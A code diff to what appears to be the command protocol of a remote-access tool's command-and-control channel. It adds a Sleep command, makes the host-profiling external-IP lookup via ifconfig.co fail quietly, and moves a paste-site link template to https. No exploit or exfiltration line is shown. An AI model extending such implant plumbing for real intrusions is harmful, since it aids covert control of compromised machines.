@@ -66,6 +66,20 @@ class Idle(Command):
     def __repr__(self):
         return '{IDLE}'
 
+class Sleep(Command):
+    @staticmethod
+    def unpack(data):
+        return Sleep(struct.unpack_from('<H', data))
+
+    def pack(self):
+        return struct.pack('<H', self.timeout)
+
+    def __init__(self, timeout=30):
+        self.timeout = timeout
+
+    def __repr__(self):
+        return '{{SLEEP: {}}}'.format(self.timeout)
+
 class Exit(Command):
     @staticmethod
     def unpack(data):
@@ -161,13 +175,18 @@ class SystemInfo(Command):
             else:
                 self.external_ip = netaddr.IPAddress(external_ip)
         else:
-            proxy = urllib2.ProxyHandler()
-            opener = urllib2.build_opener(proxy)
-            opener.addheaders = [('User-agent', 'curl/7.50.0')]
-            response = opener.open('http://ifconfig.co')
-            if response.code == 200:
-                self.external_ip = netaddr.IPAddress(response.read())
-                self.internet = True
+            try:
+                proxy = urllib2.ProxyHandler()
+                opener = urllib2.build_opener(proxy)
+                opener.addheaders = [('User-agent', 'curl/7.50.0')]
+                response = opener.open('http://ifconfig.co', timeout=5)
+                if response.code == 200:
+                    self.external_ip = netaddr.IPAddress(response.read())
+                    self.internet = True
+            except:
+                self.external_ip = None
+                self.internet = False
+
 
     def pack(self):
         # 3 bits for system, 3 bits for arch, 1 bit for internet
@@ -289,7 +308,7 @@ class PasteLink(Command):
         lambda x: to_bytes(baseconv.base62.decode(x)),
         lambda x: baseconv.base62.encode(from_bytes(x)),
     ), (
-        'http://hastebin.com/raw/{}',
+        'https://hastebin.com/raw/{}',
         lambda x: to_bytes(baseconv.base62.decode(x)),
         lambda x: baseconv.base62.encode(from_bytes(x)),
     ), (
@@ -437,7 +456,8 @@ class Parcel(object):
     # Explicitly define commands. In other case make break something
     commands = [
         Poll, Ack, Policy, Idle, Kex,
-        Connect, PasteLink, SystemInfo, Error, Disconnect, Exit
+        Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
+        Sleep
     ]
 
     commands_decode = dict(enumerate(commands))
